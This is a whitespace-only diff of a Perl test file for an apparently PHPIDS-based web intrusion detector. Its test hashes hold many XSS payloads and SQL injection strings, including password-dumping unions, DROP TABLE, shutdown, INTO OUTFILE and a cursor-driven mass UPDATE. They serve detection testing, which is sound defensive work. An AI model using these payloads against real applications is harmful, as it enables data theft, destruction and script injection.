@@ -48,77 +48,77 @@ BEGIN { use_ok('FindBin', qw($Bin)) }
 
 #------------------------- Test Data -------------------------------------------
 my %testSimpleScan = (
-    'value'		=> 'alert(1)',
+    'value'     => 'alert(1)',
 );
 
 my %testScanKeys = (
-    'alert(0)'	=> 'hallo',
-    'alert(1)'	=> 'alert(2)',
-    2			=> 'alert(#)',
-    'alert'		=> 'test',
+    'alert(0)'  => 'hallo',
+    'alert(1)'  => 'alert(2)',
+    2           => 'alert(#)',
+    'alert'     => 'test',
 );
 
 my %testWhitelistScan = (
-	login_password	=>	'alert(1)',
-	name			=>	'hinnerk',
-	action			=>	'login',
-	scr_rec_id		=>	'876876.987ef987',
-	send			=>  '',
+    login_password  =>  'alert(1)',
+    name            =>  'hinnerk',
+    action          =>  'login',
+    scr_rec_id      =>  '876876.987ef987',
+    send            =>  '',
 );
 
 my %testWhitelistScan2 = (
-	login_password	=>	'alert(1)',
-	username		=>	'hinnerk attack',
-	action			=>	'login',
-	scr_rec_id		=>	'876876.9fe87987',
-	send			=>  '',
+    login_password  =>  'alert(1)',
+    username        =>  'hinnerk attack',
+    action          =>  'login',
+    scr_rec_id      =>  '876876.9fe87987',
+    send            =>  '',
 );
 
 my %testWhitelistScan3 = (
-	login_password	=>	'alert(1)',
-	username		=>	'hinnerk',
-	action			=>	'xlogin',
-	scr_rec_id		=>	'876876.98ef7987',
-	send			=>  '',
+    login_password  =>  'alert(1)',
+    username        =>  'hinnerk',
+    action          =>  'xlogin',
+    scr_rec_id      =>  '876876.98ef7987',
+    send            =>  '',
 );
 
 my %testWhitelistScan4 = (
-	login_password	=>	'alert(1)',
-	username		=>	'hinnerk',
-	action			=>	'login',
-	scr_rec_id		=>	'876876.98ef7987alert(1)',
+    login_password  =>  'alert(1)',
+    username        =>  'hinnerk',
+    action          =>  'login',
+    scr_rec_id      =>  '876876.98ef7987alert(1)',
 );
 
 my %testWhitelistScan5 = (
-	login_password	=>	'alert(1)',
-	username		=>	'hinnerk',
-	action			=>	'login',
-	scr_rec_id		=>	'876876.98ef7987',
+    login_password  =>  'alert(1)',
+    username        =>  'hinnerk',
+    action          =>  'login',
+    scr_rec_id      =>  '876876.98ef7987',
 );
 
 my %testWhitelistSkip = (
-	login_password	=>	'alert(1)',
-	username		=>	'hinnerk',
-	action			=>	'login',
-	scr_rec_id		=>	'876876.9ef87987',
-	send			=>  '',
+    login_password  =>  'alert(1)',
+    username        =>  'hinnerk',
+    action          =>  'login',
+    scr_rec_id      =>  '876876.9ef87987',
+    send            =>  '',
 );
 
 my %testWhitelistSkip2 = (
-	login_password	=>	'alert(1)',
-	username		=>	'hinnerk',
-	action			=>	'login',
-	scr_rec_id		=>	'876876.9ef87987alert(1)',
-	send			=>  'hjjkh98798',
+    login_password  =>  'alert(1)',
+    username        =>  'hinnerk',
+    action          =>  'login',
+    scr_rec_id      =>  '876876.9ef87987alert(1)',
+    send            =>  'hjjkh98798',
 );
 
 my %testWhitelistSkip3 = (
-	login_password	=>	'alert(1)',
-	username		=>	'hinnerk',
-	action			=>	'login',
-	scr_rec_id		=>	'876876.9ef87987alert(1)',
-	send			=>  'hjjkh98798',
-	uid				=>	'alert(2)',	# skip uid everytime
+    login_password  =>  'alert(1)',
+    username        =>  'hinnerk',
+    action          =>  'login',
+    scr_rec_id      =>  '876876.9ef87987alert(1)',
+    send            =>  'hjjkh98798',
+    uid             =>  'alert(2)', # skip uid everytime
 );
 
 #------------------------- PHPIDS test data ------------------------------------
@@ -373,10 +373,10 @@ my %testXMLPredicateXSSList = (
 );
 
 my %testConditionalCompilationXSSList = (
-	1 => "/*\@cc_on\@set\@x=88\@set\@ss=83\@set\@s=83\@*/\@cc_on alert(String.fromCharCode(\@x,\@s,\@ss))",
-	2 => "\@cc_on eval(\@cc_on name)",
-	3 => "\@if(\@_mc680x0)\@else alert(\@_jscript_version)\@end",
-	4 => "\"\"\@cc_on,x=\@cc_on'something'\@cc_on",
+    1 => "/*\@cc_on\@set\@x=88\@set\@ss=83\@set\@s=83\@*/\@cc_on alert(String.fromCharCode(\@x,\@s,\@ss))",
+    2 => "\@cc_on eval(\@cc_on name)",
+    3 => "\@if(\@_mc680x0)\@else alert(\@_jscript_version)\@end",
+    4 => "\"\"\@cc_on,x=\@cc_on'something'\@cc_on",
 );
 
 my %testXSSList = (
@@ -387,7 +387,7 @@ my %testXSSList = (
         3   => 'document.__parent__._=alert
                   _(1)',
         4   => 'alert(1)',
-        5	=> "b=/a/,
+        5   => "b=/a/,
                     d=alert
                     d(",
         6  => "1
@@ -461,278 +461,278 @@ my %testXSSList = (
 );
 
 my %testSelfContainedXSSList = (
-	0   => 'a=0||\'ev\'+\'al\',b=0||1[a](\'loca\'+\'tion.hash\'),c=0||\'sub\'+\'str\',1[a](b[c](1));',
-	1   => 'eval.call(this,unescape.call(this,location))',
-	2   => 'd=0||\'une\'+\'scape\'||0;a=0||\'ev\'+\'al\'||0;b=0||\'locatio\';b+=0||\'n\'||0;c=b[a];d=c(d);c(d(c(b)))',
-	3   => '_=eval,__=unescape,___=document.URL,_(__(___))',
-	4   => '$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))',
-	5   => '$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)',
-	6   => 'ev\al.call(this,unescape.call(this,location))',
-	7   => 'setTimeout//
+    0   => 'a=0||\'ev\'+\'al\',b=0||1[a](\'loca\'+\'tion.hash\'),c=0||\'sub\'+\'str\',1[a](b[c](1));',
+    1   => 'eval.call(this,unescape.call(this,location))',
+    2   => 'd=0||\'une\'+\'scape\'||0;a=0||\'ev\'+\'al\'||0;b=0||\'locatio\';b+=0||\'n\'||0;c=b[a];d=c(d);c(d(c(b)))',
+    3   => '_=eval,__=unescape,___=document.URL,_(__(___))',
+    4   => '$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))',
+    5   => '$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)',
+    6   => 'ev\al.call(this,unescape.call(this,location))',
+    7   => 'setTimeout//
                         (name//
                         ,0)//',
-	8	=> 'a=/ev/
+    8   => 'a=/ev/
                         .source
                         a+=/al/
                         .source,a = a[a]
                         a(name)',
-	9	=> 'a=eval,b=(name);a(b)',
-	10	=> 'a=eval,b= [ referrer ] ;a(b)',
-	11	=> "URL = ! isNaN(1) ? 'javascriptz:zalertz(1)z' [/replace/ [ 'source' ] ]
+    9   => 'a=eval,b=(name);a(b)',
+    10  => 'a=eval,b= [ referrer ] ;a(b)',
+    11  => "URL = ! isNaN(1) ? 'javascriptz:zalertz(1)z' [/replace/ [ 'source' ] ]
                         (/z/g, [] ) : 0",
-	12	=> "if(0){} else eval(new Array + ('eva') + new Array + ('l(n') + new Array + ('ame) + new Array') + new Array)
+    12  => "if(0){} else eval(new Array + ('eva') + new Array + ('l(n') + new Array + ('ame) + new Array') + new Array)
                         'foo bar foo bar foo'",
-	13	=> "switch('foo bar foo bar foo bar') {case eval(new Array + ('eva') + new Array + ('l(n') + new Array + ('ame) + new Array') + new Array):}",
-	14	=> "xxx='javascr',xxx+=('ipt:eva'),xxx+=('l(n'),xxx+=('ame),y')
-	                        Cen:tri:fug:eBy:pas:sTe:xt:do location=(xxx)
-	                        while(0)
-	                        ",
-	15 => '-parent(1)',
-	16 => "//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf
+    13  => "switch('foo bar foo bar foo bar') {case eval(new Array + ('eva') + new Array + ('l(n') + new Array + ('ame) + new Array') + new Array):}",
+    14  => "xxx='javascr',xxx+=('ipt:eva'),xxx+=('l(n'),xxx+=('ame),y')
+                            Cen:tri:fug:eBy:pas:sTe:xt:do location=(xxx)
+                            while(0)
+                            ",
+    15 => '-parent(1)',
+    16 => "//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf
                         (new Option)['innerHTML']=opener.name",
 );
 
 my %testSQLIList = (
-	0   => '" OR 1=1#',
-	1   => '; DROP table Users --',
-	2   => '/**/S/**/E/**/L/**/E/**/C/**/T * FROM users WHERE 1 = 1',
-	3   => 'admin\'--',
-	4   => 'SELECT /*!32302 1/0, */ 1 FROM tablename',
-	5   => '10;DROP members --',
-	6   => ' SELECT IF(1=1,\'true\',\'false\')',
-	7   => 'SELECT CHAR(0x66)',
-	8   => 'SELECT LOAD_FILE(0x633A5C626F6F742E696E69)',
-	9   => 'EXEC(@stored_proc @param)',
-	10  => 'chr(11)||chr(12)||char(13)',
-	11  => 'MERGE INTO bonuses B USING (SELECT',
-	12  => '1 or name like \'%\'',
-	13  => '1 OR \'1\'!=0',
-	14  => '1 OR ASCII(2) = ASCII(2)',
-	15  => '1\' OR 1&"1',
-	16  => '1\' OR \'1\' XOR \'0',
-	17  => '1 OR+1=1',
-	18  => '1 OR+(1)=(1)',
-	19  => '1 OR \'1',
-	20  => 'aaa\' or (1)=(1) #!asd',
-	21  => 'aaa\' OR (1) IS NOT NULL #!asd',
-	22  => 'a\' or 1=\'1',
-	23  => 'asd\' union (select username,password from admins) where id=\'1',
-	24  => "1'; WAITFOR TIME '17:48:00 ' shutdown -- -a",
-	25  => "1'; anything: goto anything -- -a",
-	26  => "' =+ '",
-	27  => "asd' =- (-'asd') -- -a",
-	28  => 'aa"in+ ("aa") or -1 != "0',
-	29  => 'aa" =+ - "0  ',
-	30  => "aa' LIKE 0 -- -a",
-	31  => "aa' LIKE md5(1) or '1",
-	32  => "aa' REGEXP- md5(1) or '1",
-	33  => "aa' DIV\@1 = 0 or '1",
-	34  => "aa' XOR- column != -'0",
-	35  => '============================="',
+    0   => '" OR 1=1#',
+    1   => '; DROP table Users --',
+    2   => '/**/S/**/E/**/L/**/E/**/C/**/T * FROM users WHERE 1 = 1',
+    3   => 'admin\'--',
+    4   => 'SELECT /*!32302 1/0, */ 1 FROM tablename',
+    5   => '10;DROP members --',
+    6   => ' SELECT IF(1=1,\'true\',\'false\')',
+    7   => 'SELECT CHAR(0x66)',
+    8   => 'SELECT LOAD_FILE(0x633A5C626F6F742E696E69)',
+    9   => 'EXEC(@stored_proc @param)',
+    10  => 'chr(11)||chr(12)||char(13)',
+    11  => 'MERGE INTO bonuses B USING (SELECT',
+    12  => '1 or name like \'%\'',
+    13  => '1 OR \'1\'!=0',
+    14  => '1 OR ASCII(2) = ASCII(2)',
+    15  => '1\' OR 1&"1',
+    16  => '1\' OR \'1\' XOR \'0',
+    17  => '1 OR+1=1',
+    18  => '1 OR+(1)=(1)',
+    19  => '1 OR \'1',
+    20  => 'aaa\' or (1)=(1) #!asd',
+    21  => 'aaa\' OR (1) IS NOT NULL #!asd',
+    22  => 'a\' or 1=\'1',
+    23  => 'asd\' union (select username,password from admins) where id=\'1',
+    24  => "1'; WAITFOR TIME '17:48:00 ' shutdown -- -a",
+    25  => "1'; anything: goto anything -- -a",
+    26  => "' =+ '",
+    27  => "asd' =- (-'asd') -- -a",
+    28  => 'aa"in+ ("aa") or -1 != "0',
+    29  => 'aa" =+ - "0  ',
+    30  => "aa' LIKE 0 -- -a",
+    31  => "aa' LIKE md5(1) or '1",
+    32  => "aa' REGEXP- md5(1) or '1",
+    33  => "aa' DIV\@1 = 0 or '1",
+    34  => "aa' XOR- column != -'0",
+    35  => '============================="',
 );
 
 my %testSQLIList2 = (
-	0   => 'asd"or-1="-1',
-	1   => 'asd"or!1="!1',
-	2   => 'asd"or!(1)="1',
-	3   => 'asd"or@1="@1',
-	4   => 'asd"or-1 XOR"0',
-	5   => 'asd" or ascii(1)="49',
-	6   => 'asd" or md5(1)^"1',
-	7   => 'asd" or table.column^"1',
-	8   => 'asd" or @@version^"0',
-	9   => 'asd" or @@global.hot_cache.key_buffer_size^"1',
-	10  => 'asd" or!(selec79t name from users limit 1)="1',
-	11  => '1"OR!"a',
-	12  => '1"OR!"0',
-	13  => '1"OR-"1',
-	14  => '1"OR@"1" IS NULL #1 ! (with unfiltered comment by tx ;)',
-	15  => '1"OR!(false) #1 !',
-	16  => '1"OR-(true) #a !',
-	17  => '1" INTO OUTFILE "C:/webserver/www/readme.php',
-	18  => "asd' or md5(5)^'1 ",
-	19  => "asd' or column^'-1 ",
-	20  => "asd' or true -- a",
-	21  => '\"asd" or 1="1',
-	22  => "a 1' or if(-1=-1,true,false)#!",
-	23  => 'aa\\\\"aaa'."' or '1",
-	24  => "' or id= 1 having 1 #1 !",
-	25  => "' or id= 2-1 having 1 #1 !",
-	26  => "aa'or null is null #(",
-	27  => "aa'or current_user!=' 1",
-	28  => "aa'or BINARY 1= '1",
-	29  => "aa'or LOCALTIME!='0",
-	30  => "aa'like-'aa",
-	31  => "aa'is".'\N'."|!'",
-	32  => "'is".'\N'."-!'",
-	33  => "asd'|column&&'1",
-	34  => "asd'|column!='",
-	35  => "aa'or column=column -- #aa",
-	36  => "aa'or column*column!='0",
-	37  => "aa'or column like column -- #a",
-	38  => "0'*column is ".'\N'." - '1",
-	39  => "1'*column is ".'\N'." or '1",
-	40  => "1'*\@a is ".'\N'." - '",
-	41  => "1'*\@a is ".'\N'." or '1",
-	42  => "1' -1 or+1= '+1 ",
-	43  => "1' -1 - column or '1 ",
-	44  => "1' -1 or '1",
-	45  => " (1)or(1)=(1) ",
+    0   => 'asd"or-1="-1',
+    1   => 'asd"or!1="!1',
+    2   => 'asd"or!(1)="1',
+    3   => 'asd"or@1="@1',
+    4   => 'asd"or-1 XOR"0',
+    5   => 'asd" or ascii(1)="49',
+    6   => 'asd" or md5(1)^"1',
+    7   => 'asd" or table.column^"1',
+    8   => 'asd" or @@version^"0',
+    9   => 'asd" or @@global.hot_cache.key_buffer_size^"1',
+    10  => 'asd" or!(selec79t name from users limit 1)="1',
+    11  => '1"OR!"a',
+    12  => '1"OR!"0',
+    13  => '1"OR-"1',
+    14  => '1"OR@"1" IS NULL #1 ! (with unfiltered comment by tx ;)',
+    15  => '1"OR!(false) #1 !',
+    16  => '1"OR-(true) #a !',
+    17  => '1" INTO OUTFILE "C:/webserver/www/readme.php',
+    18  => "asd' or md5(5)^'1 ",
+    19  => "asd' or column^'-1 ",
+    20  => "asd' or true -- a",
+    21  => '\"asd" or 1="1',
+    22  => "a 1' or if(-1=-1,true,false)#!",
+    23  => 'aa\\\\"aaa'."' or '1",
+    24  => "' or id= 1 having 1 #1 !",
+    25  => "' or id= 2-1 having 1 #1 !",
+    26  => "aa'or null is null #(",
+    27  => "aa'or current_user!=' 1",
+    28  => "aa'or BINARY 1= '1",
+    29  => "aa'or LOCALTIME!='0",
+    30  => "aa'like-'aa",
+    31  => "aa'is".'\N'."|!'",
+    32  => "'is".'\N'."-!'",
+    33  => "asd'|column&&'1",
+    34  => "asd'|column!='",
+    35  => "aa'or column=column -- #aa",
+    36  => "aa'or column*column!='0",
+    37  => "aa'or column like column -- #a",
+    38  => "0'*column is ".'\N'." - '1",
+    39  => "1'*column is ".'\N'." or '1",
+    40  => "1'*\@a is ".'\N'." - '",
+    41  => "1'*\@a is ".'\N'." or '1",
+    42  => "1' -1 or+1= '+1 ",
+    43  => "1' -1 - column or '1 ",
+    44  => "1' -1 or '1",
+    45  => " (1)or(1)=(1) ",
 );
 
 my %testSQLIList3 = (
-	0   => "' OR UserID IS NOT 2",
-	1   => "' OR UserID IS NOT NULL",
-	2   => "' OR UserID > 1",
-	3   => "'  OR UserID RLIKE  '.+' ",
-	4   => "'OR UserID <> 2",
-	5   => "1' union (select password from users) -- -a",
-	6   => "1' union (select'1','2',password from users) -- -a",
-	7   => "1' union all (select'1',password from users) -- -a",
-	8   => "aa'!='1",
-	9   => "aa'!=~'1",
-	10  => "aa'=('aa')#(",
-	11  => "aa'|+'1",
-	12  => "aa'|!'aa",
-	13  => "aa'^!'aa ",
-	14  => "abc' = !!'0",
-	15  => "abc' = !!!!'0",
-	16  => "abc' = !!!!!!!!!!!!!!'0",
-	17  => "abc' = !0 = !!'0",
-	18  => "abc' = !0 != !!!'0",
-	19  => "abc' = !+0 != !'0 ",
-	20  => "aa'=+'1",
-	21  => "';if 1=1 drop database test-- -a",
-	22  => "';if 1=1 drop table users-- -a",
-	23  => "';if 1=1 shutdown-- -a",
-	24  => "'; while 1=1 shutdown-- -a",
-	25  => "'; begin shutdown end-- -a ",
-	26  => "'+COALESCE('admin') and 1 = !1 div 1+'",
-	27  => "'+COALESCE('admin') and @\@version = !1 div 1+'",
-	28  => "'+COALESCE('admin') and @\@version = !@\@version div @\@version+'",
-	29  => "'+COALESCE('admin') and 1 =+1 = !true div @\@version+'",
+    0   => "' OR UserID IS NOT 2",
+    1   => "' OR UserID IS NOT NULL",
+    2   => "' OR UserID > 1",
+    3   => "'  OR UserID RLIKE  '.+' ",
+    4   => "'OR UserID <> 2",
+    5   => "1' union (select password from users) -- -a",
+    6   => "1' union (select'1','2',password from users) -- -a",
+    7   => "1' union all (select'1',password from users) -- -a",
+    8   => "aa'!='1",
+    9   => "aa'!=~'1",
+    10  => "aa'=('aa')#(",
+    11  => "aa'|+'1",
+    12  => "aa'|!'aa",
+    13  => "aa'^!'aa ",
+    14  => "abc' = !!'0",
+    15  => "abc' = !!!!'0",
+    16  => "abc' = !!!!!!!!!!!!!!'0",
+    17  => "abc' = !0 = !!'0",
+    18  => "abc' = !0 != !!!'0",
+    19  => "abc' = !+0 != !'0 ",
+    20  => "aa'=+'1",
+    21  => "';if 1=1 drop database test-- -a",
+    22  => "';if 1=1 drop table users-- -a",
+    23  => "';if 1=1 shutdown-- -a",
+    24  => "'; while 1=1 shutdown-- -a",
+    25  => "'; begin shutdown end-- -a ",
+    26  => "'+COALESCE('admin') and 1 = !1 div 1+'",
+    27  => "'+COALESCE('admin') and @\@version = !1 div 1+'",
+    28  => "'+COALESCE('admin') and @\@version = !@\@version div @\@version+'",
+    29  => "'+COALESCE('admin') and 1 =+1 = !true div @\@version+'",
 );
 
 my %testSQLIList4 = (
-	0   => "aa'in (0)#(",
-	1   => "aa'!=ascii(1)#(",
-	2   => "' or SOUNDEX (1) != '0",
-	3   => "aa'RLIKE BINARY 0#(",
-	4   => "aa'or column!='1",
-	5   => "aa'or column DIV 0 =0 #",
-	6   => "aa'or column+(1)='1",
-	7   => "aa'or 0!='0",
-	8   => "aa'LIKE'0",
-	9   =>  "aa'or id ='\'",
-	10  =>  "1';declare @# int;shutdown;set @# = '1",
-	11  =>  "1';declare @@ int;shutdown;set @@ = '1",
-	12  =>  "asd' or column&&'1",
-	13  =>  "asd' or column= !1 and+1='1",
-	14  =>  "aa'!=ascii(1) or-1=-'1",
-	15  =>  "a'IS NOT NULL or+1=+'1",
-	16  =>  "aa'in('aa') or-1!='0",
-	17  =>  "aa' or column=+!1 #1",
-	18  =>  "aa' SOUNDS like+'1",
-	19  =>  "aa' REGEXP+'0",
-	20  =>  "aa' like+'0",
-	21  =>  "-1'=-'+1",
-	22  =>  "'=+'",
-	23  =>  "aa' or stringcolumn= +!1 #1 ",
-	24  =>  "aa' or anycolumn ^ -'1",
-	25  =>  "aa' or intcolumn && '1",
-	26  =>  "asd' or column&&'1",
-	27  =>  "asd' or column= !1 and+1='1",
-	28  =>  "aa' or column=+!1 #1",
-	29  =>  "aa'IS NOT NULL or+1^+'0",
-	30  =>  "aa'IS NOT NULL or +1-1 xor'0",
-	31  =>  "aa'IS NOT NULL or+2-1-1-1 !='0",
-	32  =>  "aa'|1+1=(2)Or(1)='1",
-	33  =>  "aa'|3!='4",
-	34  =>  "aa'|ascii(1)+1!='1",
-	35  =>  "aa'|LOCALTIME*0!='1 ",
-	36  =>  "asd' |1 != (1)#aa",
-	37  =>  "' is 99999 = '",
-	38  =>  "' is 0.00000000000 = '",
-	39  =>  "1'*column-0-'0",
-	40  =>  "1'-\@a or'1",
-	41  =>  "a'-\@a=\@a or'1",
-	42  =>  "aa' *\@var or 1 SOUNDS LIKE (1)|'1",
-	43  =>  "aa' *\@var or 1 RLIKE (1)|'1 ",
-	44  =>  "a' or~column like ~1|'1",
-	45  =>  "'<~'",
-	46  =>  "a'-1.and '1",
-	);
+    0   => "aa'in (0)#(",
+    1   => "aa'!=ascii(1)#(",
+    2   => "' or SOUNDEX (1) != '0",
+    3   => "aa'RLIKE BINARY 0#(",
+    4   => "aa'or column!='1",
+    5   => "aa'or column DIV 0 =0 #",
+    6   => "aa'or column+(1)='1",
+    7   => "aa'or 0!='0",
+    8   => "aa'LIKE'0",
+    9   =>  "aa'or id ='\'",
+    10  =>  "1';declare @# int;shutdown;set @# = '1",
+    11  =>  "1';declare @@ int;shutdown;set @@ = '1",
+    12  =>  "asd' or column&&'1",
+    13  =>  "asd' or column= !1 and+1='1",
+    14  =>  "aa'!=ascii(1) or-1=-'1",
+    15  =>  "a'IS NOT NULL or+1=+'1",
+    16  =>  "aa'in('aa') or-1!='0",
+    17  =>  "aa' or column=+!1 #1",
+    18  =>  "aa' SOUNDS like+'1",
+    19  =>  "aa' REGEXP+'0",
+    20  =>  "aa' like+'0",
+    21  =>  "-1'=-'+1",
+    22  =>  "'=+'",
+    23  =>  "aa' or stringcolumn= +!1 #1 ",
+    24  =>  "aa' or anycolumn ^ -'1",
+    25  =>  "aa' or intcolumn && '1",
+    26  =>  "asd' or column&&'1",
+    27  =>  "asd' or column= !1 and+1='1",
+    28  =>  "aa' or column=+!1 #1",
+    29  =>  "aa'IS NOT NULL or+1^+'0",
+    30  =>  "aa'IS NOT NULL or +1-1 xor'0",
+    31  =>  "aa'IS NOT NULL or+2-1-1-1 !='0",
+    32  =>  "aa'|1+1=(2)Or(1)='1",
+    33  =>  "aa'|3!='4",
+    34  =>  "aa'|ascii(1)+1!='1",
+    35  =>  "aa'|LOCALTIME*0!='1 ",
+    36  =>  "asd' |1 != (1)#aa",
+    37  =>  "' is 99999 = '",
+    38  =>  "' is 0.00000000000 = '",
+    39  =>  "1'*column-0-'0",
+    40  =>  "1'-\@a or'1",
+    41  =>  "a'-\@a=\@a or'1",
+    42  =>  "aa' *\@var or 1 SOUNDS LIKE (1)|'1",
+    43  =>  "aa' *\@var or 1 RLIKE (1)|'1 ",
+    44  =>  "a' or~column like ~1|'1",
+    45  =>  "'<~'",
+    46  =>  "a'-1.and '1",
+    );
 
 my %testSQLIList5 = (
-	0   => "aa'/1 DIV 1 or+1=+'1 ",
-	1   => "aa'&0+1='aa",
-	2   => "aa' like(0) + 1-- -a ",
-	3   => "aa'^0+0='0",
-	4   => "aa'^0+0+1-1=(0)-- -a",
-	5   => "aa'<3+1 or+1=+'1",
-	6   => "aa'\%1+0='0",
-	7   => "'/1/1='",
-	8   => " aa'/1 or '1",
-	9   => " aa1' * \@a or '1 '/1 regexp '0",
-	10  => " ' / 1 / 1 ='",
-	11  => " '/1='",
-	12  => " aa'&0+1 = 'aa",
-	13  => " aa'&+1='aa",
-	14  => " aa'&(1)='aa",
-	15  => " aa'^0+0 = '0",
-	16  => " aa'^0+0+1-1 = (0)-- -a",
-	17  => " aa'^+-3 or'1",
-	18  => " aa'^0!='1",
-	19  => " aa'^(0)='0",
-	20  => " aa' < (3) or '1",
-	21  => " aa' <<3 or'1",
-	22  => " aa'-+!1 or '1",
-	23  => " aa'-!1 like'0",
-	24  => " aa' % 1 or '1",
-	25  => " aa' / '1' < '3",
-	26  => " aa' / +1 < '3",
-	27  => " aa' - + ! 2 != + - '1",
-	28  => " aa' - + ! 1 or '1",
-	29  => " aa' / +1 like '0",
-	30  => " ' / + (1) / + (1) ='",
-	31  => " aa' & +(0)-(1)='aa",
-	32  => " aa' ^+ -(0) + -(0) = '0",
-	33  => " aa' ^ + - 3 or '1",
-	34  => " aa' ^ +0!='1",
-	35  => " aa' < +3 or '1",
-	36  => " aa' % +1 or '1",
-	37  => "aa'or column*0 like'0",
-	38  => "aa'or column*0='0",
-	39  => "aa'or current_date*0",
-	40  => "1'/column is not null - ' ",
-	41  => "1'*column is not ".'\N'." - ' ",
-	42  => "1'^column is not null - ' ",
-	43  => "'is".'\N'." - '1",
-	44  => "aa' is 0 or '1",
-	45  => "' or MATCH username AGAINST ('+admin -a' IN BOOLEAN MODE); -- -a",
-	46  => "' or MATCH username AGAINST ('a* -) -+ ' IN BOOLEAN MODE); -- -a",
-	47  => "1'*\@a or '1",
-	48  => "1'*null or '1",
-	49  => "1'*UTC_TIME or '1",
-	50  => "1'*null is null - '",
-	51  => "1'*\@a is null - '",
-	52  => "1'*\@\@version*-0%20=%20'0",
-	53  => "1'*current_date rlike'0",
-	54  => "aa'/current_date in (0) -- -a",
-	55  => "aa' / current_date regexp '0",
-	56  => "aa' / current_date != '1",
-	57  => "1' or current_date*-0 rlike'1",
-	58  => "0' / current_date XOR '1",
-	60  => "'or not false #aa",
-	61  => "1' * id - '0",
-	62  => "1' *id-'0",
+    0   => "aa'/1 DIV 1 or+1=+'1 ",
+    1   => "aa'&0+1='aa",
+    2   => "aa' like(0) + 1-- -a ",
+    3   => "aa'^0+0='0",
+    4   => "aa'^0+0+1-1=(0)-- -a",
+    5   => "aa'<3+1 or+1=+'1",
+    6   => "aa'\%1+0='0",
+    7   => "'/1/1='",
+    8   => " aa'/1 or '1",
+    9   => " aa1' * \@a or '1 '/1 regexp '0",
+    10  => " ' / 1 / 1 ='",
+    11  => " '/1='",
+    12  => " aa'&0+1 = 'aa",
+    13  => " aa'&+1='aa",
+    14  => " aa'&(1)='aa",
+    15  => " aa'^0+0 = '0",
+    16  => " aa'^0+0+1-1 = (0)-- -a",
+    17  => " aa'^+-3 or'1",
+    18  => " aa'^0!='1",
+    19  => " aa'^(0)='0",
+    20  => " aa' < (3) or '1",
+    21  => " aa' <<3 or'1",
+    22  => " aa'-+!1 or '1",
+    23  => " aa'-!1 like'0",
+    24  => " aa' % 1 or '1",
+    25  => " aa' / '1' < '3",
+    26  => " aa' / +1 < '3",
+    27  => " aa' - + ! 2 != + - '1",
+    28  => " aa' - + ! 1 or '1",
+    29  => " aa' / +1 like '0",
+    30  => " ' / + (1) / + (1) ='",
+    31  => " aa' & +(0)-(1)='aa",
+    32  => " aa' ^+ -(0) + -(0) = '0",
+    33  => " aa' ^ + - 3 or '1",
+    34  => " aa' ^ +0!='1",
+    35  => " aa' < +3 or '1",
+    36  => " aa' % +1 or '1",
+    37  => "aa'or column*0 like'0",
+    38  => "aa'or column*0='0",
+    39  => "aa'or current_date*0",
+    40  => "1'/column is not null - ' ",
+    41  => "1'*column is not ".'\N'." - ' ",
+    42  => "1'^column is not null - ' ",
+    43  => "'is".'\N'." - '1",
+    44  => "aa' is 0 or '1",
+    45  => "' or MATCH username AGAINST ('+admin -a' IN BOOLEAN MODE); -- -a",
+    46  => "' or MATCH username AGAINST ('a* -) -+ ' IN BOOLEAN MODE); -- -a",
+    47  => "1'*\@a or '1",
+    48  => "1'*null or '1",
+    49  => "1'*UTC_TIME or '1",
+    50  => "1'*null is null - '",
+    51  => "1'*\@a is null - '",
+    52  => "1'*\@\@version*-0%20=%20'0",
+    53  => "1'*current_date rlike'0",
+    54  => "aa'/current_date in (0) -- -a",
+    55  => "aa' / current_date regexp '0",
+    56  => "aa' / current_date != '1",
+    57  => "1' or current_date*-0 rlike'1",
+    58  => "0' / current_date XOR '1",
+    60  => "'or not false #aa",
+    61  => "1' * id - '0",
+    62  => "1' *id-'0",
 );
 
 my %testSQLIList6 = (
-	0 => "asd'; shutdown; ",
-	1 => "asd'; select null,password,null from users; ",
-	2 => "aa aa'; DECLARE tablecursor CURSOR FOR select a.name as c,b.name as d,(null)from sysobjects a,syscolumns b where a.id=b.id and a.xtype = ( 'u' ) and current_user = current_user OPEN tablecursor ",
-	3 => "aa aa'; DECLARE tablecursor CURSOR FOR select a.name as c,b.name as d,(null)from sysobjects a,syscolumns b
+    0 => "asd'; shutdown; ",
+    1 => "asd'; select null,password,null from users; ",
+    2 => "aa aa'; DECLARE tablecursor CURSOR FOR select a.name as c,b.name as d,(null)from sysobjects a,syscolumns b where a.id=b.id and a.xtype = ( 'u' ) and current_user = current_user OPEN tablecursor ",
+    3 => "aa aa'; DECLARE tablecursor CURSOR FOR select a.name as c,b.name as d,(null)from sysobjects a,syscolumns b
                 where a.id=b.id and a.xtype = ( 'u' ) and current_user = current_user
                 OPEN tablecursor FETCH NEXT FROM tablecursor INTO \@a,\@b WHILE(\@a != null)
                 \@query  = null+null+null+null+ ' UPDATE '+null+\@a+null+ ' SET id=null,\@b = \@payload'
@@ -740,60 +740,60 @@ my %testSQLIList6 = (
                 FETCH NEXT FROM tablecursor INTO \@a,\@b END
                 CLOSE tablecursor DEALLOCATE tablecursor;
                 and some text, to get pass the centrifuge; and some more text.",
-	4 => "\@query  = null+null+null+ ' UPDATE '+null+\@a+ ' SET[  '+null+\@b+ ' ]  = \@payload'",
-	5 => "asd' union distinct(select null,password,null from users)--a ",
-	6 => "asd' union distinct ( select null,password,(null)from user )-- a ",
